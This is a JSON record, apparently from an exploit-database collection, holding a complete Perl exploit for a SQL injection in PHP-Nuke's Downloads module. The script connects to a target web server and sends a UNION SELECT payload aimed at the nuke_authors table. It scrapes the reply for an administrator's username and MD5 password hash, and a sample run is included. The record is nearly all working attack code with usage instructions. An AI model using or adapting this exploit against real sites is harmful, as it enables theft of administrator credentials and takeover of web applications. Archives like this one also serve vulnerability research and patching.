{
  "id": "138",
  "title": "PHP-Nuke 6.9 - &#039;cid&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\nuse IO::Socket;\r\n\r\n########################################\r\n## THIS CODE PUBLIC NOW  =)))        ##\r\n########################################\r\n## __________               ___ ___   ##\r\n## \\______   \\__ __  ______/   |   \\  ##\r\n##  |       _/  |  \\/  ___/    _    \\ ##\r\n##  |    |   \\  |  /\\___ \\\\         / ##\r\n##  |____|_  /____//____  >\\___|_  /  ##\r\n##         \\/           \\/       \\/   ##\r\n########################################\r\n## based on 'cid' sql injection vuln\r\n## in Download module, more info about\r\n## this vuln u can see here:\r\n## http://rst.void.ru/texts/advisory10.htm\r\n########################################\r\n## work only on mysql version > 4.0\r\n########################################\r\n## tested on PHP-Nuke versions: 6.9, 6.0, 6.5\r\n## C:\\>r57phpnuke.pl 127.0.0.1 /phpnuke/ admin\r\n##\r\n## server : 127.0.0.1\r\n## folder : /phpnuke/\r\n## aid    : admin\r\n##\r\n## [~] prepare to connect...\r\n## [+] connected\r\n## [~] prepare to send data...\r\n## [+] success\r\n## [~] wait for reply...\r\n## [+] w00t...\r\n## [+] USER: admin\r\n## [+] MD5 HASH: 5f4dcc3b5aa765d61d8327deb882cf99\r\n##\r\n########################################\r\n\r\nif (@ARGV < 3)\r\n{\r\nprint \"#############################################################\\n\";\r\nprint \" r57nuke-cid.pl - PHP-NUKE 'cid' sql injection exploit\\n\";\r\nprint \" by RusH security team // www.rsteam.ru , http://rst.void.ru\\n\";\r\nprint \" coded by 1dt.w0lf // r00t\\@rsteam.ru // 17.09.2003\\n\";\r\nprint \"#############################################################\\n\";\r\nprint \" Usage:\\n\";\r\nprint \" r57nuke-cid.pl <host> </folder/> <aid>\\n\";\r\nprint \"\\n\";\r\nprint \" <host> - host for attack\\n\";\r\nprint \" </folder/> - PHP-nuke folder ( /phpnuke/ , /nuke/ or / for no folder )\\n\";\r\nprint \" <aid> - user aid , nick ( admin , blabla )\\n\";\r\nprint \"#############################################################\";\r\nexit();\r\n}\r\n\r\n$server = $ARGV[0];\r\n$folder = $ARGV[1];\r\n$aid = $ARGV[2];\r\n\r\nprint \"\\n\";\r\nprint \"server : $server\\n\";\r\nprint \"folder : $folder\\n\";\r\nprint \"aid    : $aid\\n\";\r\nprint \"\\n\";\r\n$success = 0;\r\n$path_download = \"modules.php?name=Downloads&d_op=viewdownload&cid=2%20\r\nUNION%20select%20counter,%20aid,%20pwd%20FROM%20nuke_authors%20--\";\r\n$GET = $folder . $path_download;\r\nprint \"[~] prepare to connect...\\n\";\r\n$socket = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$server\", PeerPort => \"80\") || \r\ndie \"[-] connect failed\\n\";\r\nprint \"[+] connected\\n\";\r\nprint \"[~] prepare to send data...\\n\";\r\nprint $socket \"GET $GET HTTP/1.1\\n\";\r\nprint $socket \"Host: $server\\n\";\r\nprint $socket \"Accept: */*\\n\";\r\nprint $socket \"Http-Referer: http://microsoft.com\\n\";\r\nprint $socket \"User-Agent: Internet Explorer 6.0\\n\";\r\nprint $socket \"Pragma: no-cache\\n\";\r\nprint $socket \"Cache-Control: no-cache\\n\";\r\nprint $socket \"Connection: close\\n\\n\";\r\nprint \"[+] success\\n\";\r\nprint \"[~] wait for reply...\\n\";\r\nwhile ($answer = <$socket>)\r\n{\r\n #print \"$answer\";\r\n if ($answer=~/(&amp;cid=)(\\w)(\\\"><b>)($aid)(<\\/b><\\/a><\\/font>)(.{0,20})\r\n(<font class=\\\"content\\\">)(.{32})(<\\/font>)/)\r\n {\r\n $success = 1;\r\n print \"[+] w00t...\\n\";\r\n print \"[+] USER: $1 \\n[+] MD5 HASH: $6\\n\";\r\n }\r\n}\r\nif ($success == 0) { print \"[-] exploit failed =(\\n\"; }\r\n\r\n# milw0rm.com [2003-12-21]",
  "url": "https://www.exploit-db.com/exploits/138"
}